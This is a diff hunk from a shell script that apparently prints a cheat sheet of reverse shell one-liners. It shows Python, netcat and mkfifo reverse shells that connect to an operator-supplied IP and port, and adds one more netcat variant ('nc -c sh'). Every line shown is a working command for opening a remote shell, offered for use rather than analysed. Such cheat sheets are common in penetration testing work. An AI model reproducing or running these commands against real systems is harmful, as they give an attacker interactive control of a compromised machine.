@@ -32,6 +32,7 @@ echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
 echo -e "${yellowColour}Netcat${endColour}"
 echo -e "nc -e /bin/sh $ip $port"
 echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f \r\n"
+echo -e "nc -c sh $ip $port"
 
 #Perl
 echo -e "${yellowColour}Perl${endColour}"
